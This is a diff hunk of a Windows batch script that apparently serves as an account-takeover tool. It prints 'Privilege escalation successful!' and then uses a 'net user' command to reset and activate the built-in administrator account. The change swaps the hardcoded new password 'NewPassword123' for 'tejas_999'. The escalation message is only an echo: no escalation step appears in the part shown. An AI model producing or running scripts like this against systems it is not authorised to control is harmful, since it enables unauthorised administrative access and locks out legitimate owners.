@@ -19,7 +19,7 @@ echo ==================================================
 echo Privilege escalation successful!
 echo Resetting the administrator password now...
 echo ==================================================
-net user administrator NewPassword123 /active:yes
+net user administrator tejas_999 /active:yes
 echo ==================================================
 echo Admin Password Reset Complete!
 echo ==================================================
